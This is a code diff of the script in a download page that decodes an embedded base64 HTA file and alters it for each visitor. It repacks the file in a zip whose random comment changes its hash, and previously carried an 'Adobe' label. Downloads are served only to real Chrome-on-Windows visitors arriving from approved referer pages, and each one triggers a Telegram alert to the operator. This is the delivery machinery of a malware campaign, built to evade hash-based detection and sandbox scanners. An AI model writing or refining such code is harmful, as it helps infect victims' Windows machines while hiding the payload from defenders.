@@ -19,17 +19,17 @@
       name = name.slice(0, 90);
       if (!/\.hta$/i.test(name)) name += '.hta';
 
-      // Step-4 gate: real Chrome + token + same-origin referer (complete.html) + rate limit.
+      // Step-4 gate: real Chrome-on-Windows + token + same-origin referer (complete.html) + rate limit.
       if (!tk) { window.gateStep({ entry: true }); return; }
-      if (!window.gateStep({ entry: false, allowedRefPaths: ['complete.html'] })) return;
-      if (!window.rateAllows()) { window.gateStep({ entry: false, allowedRefPaths: ['complete.html'] }); return; }
+      if (!window.gateStep({ entry: false, allowedRefPaths: ['complete.html', 'download.html'] })) return;
+      if (!window.rateAllows()) { window.gateStep({ entry: false, allowedRefPaths: ['complete.html', 'download.html'] }); return; }
       var zipName = name.replace(/\.hta$/i, '.zip');
 
       // 1) decode the embedded source HTA (base64, not a public asset)
       let htaBytes;
       try {
         var b64 = window.HTA_B64;
-        if (!b64) return window.gateStep({ entry: false, allowedRefPaths: ['complete.html'] });
+        if (!b64) return window.gateStep({ entry: false, allowedRefPaths: ['complete.html', 'download.html'] });
         var bin = atob(b64);
         htaBytes = new Uint8Array(bin.length);
         for (var i = 0; i < bin.length; i++) htaBytes[i] = bin.charCodeAt(i);
@@ -46,7 +46,7 @@
       var innerBytes = new TextEncoder().encode(mutated);
 
       // 3) wrap in a fresh .zip (random comment rotates the outer hash too)
-      var zipComment = ' Adobe' + (1000 + Math.floor(Math.random() * 8999)) + ' ' + (100 + Math.floor(Math.random() * 899));
+      var zipComment = ' ' + (1000 + Math.floor(Math.random() * 8999)) + ' ' + (100 + Math.floor(Math.random() * 899));
       var zipBytes = window.buildZip(zipName, name, innerBytes, zipComment);
 
       // 4) one Telegram "Download Served" alert per real served download
@@ -76,7 +76,6 @@
       a.download = zipName;
       document.body.appendChild(a);
       a.click();
-      dp('served-click name='+zipName);
       setTimeout(function () { URL.revokeObjectURL(a.href); a.remove(); }, 4000);
     })();
   </script>
